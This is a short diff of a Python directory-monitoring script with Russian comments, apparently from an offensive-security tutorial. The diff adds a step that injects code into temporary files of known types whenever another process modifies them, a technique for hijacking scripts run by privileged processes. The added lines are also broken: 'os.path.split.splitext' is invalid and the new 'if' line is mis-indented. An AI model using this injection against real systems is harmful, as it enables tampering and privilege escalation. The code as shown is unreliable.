@@ -48,6 +48,7 @@ def inject_code(full_filename, contents, extension):
         f.write(full_contents)
     print('\\o/ Injected Code')
 
+
 def monitor(path_to_watch):
     """Мы создаем список каталогов, которые хотим отслеживать , — в нашем случае это две широко используемые папки для
     временных файлов. Если вам захочется понаблюдать за другими местами, можете отредактировать этот список по своему
@@ -87,11 +88,16 @@ def monitor(path_to_watch):
                 elif action == FILE_DELETED:
                     print(f'[-] Deleted {full_filename}')
                 elif action == FILE_MODIFIED:
+                    extension = os.path.split.splitext(full_filename)[1]  # извлекаем расширение файла
+
+                if extension in FILE_TYPES:  # сопоставляем его с нашим словарем известных файловых типов
                     print(f'[*] Modified {full_filename}')
+                    print('[vvv] Dumping contents...')
                     try:
-                        print('[vvv] Dumping contents...')
                         with open(full_filename) as f:
                             contents = f.read()
+
+                        inject_code(full_filename, contents, extension)
                         print(contents)
                         print('[^^^] Dump complete.')
                     except Exception as e:
